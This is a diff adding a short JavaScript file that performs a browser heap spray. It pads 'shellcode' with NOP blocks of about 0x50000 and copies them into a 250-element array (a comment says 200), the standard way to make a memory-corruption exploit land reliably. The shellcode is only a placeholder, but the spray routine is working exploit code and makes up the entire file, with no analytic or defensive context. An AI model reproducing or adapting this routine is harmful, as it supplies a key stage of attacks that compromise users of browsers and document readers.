@@ -1,0 +1,16 @@
+shellcode = unescape('%u4141%u4141'); 
+nops = unescape('%u9090%u9090');
+headersize = 20;
+
+// create one block with nops
+slackspace = headersize + shellcode.length;
+while(nops.length < slackspace) nops += nops;
+fillblock= nops.substring(0, slackspace);
+
+//enlarge block with nops, size 0x50000
+block= nops.substring(0, nops.length - slackspace);
+while(block.length+slackspace < 0x50000) block= block+ block+ fillblock;
+
+//spray 200 times : nops + shellcode
+memory=new Array();
+for( counter=0; counter<250; counter++) memory[counter]= block + shellcode;
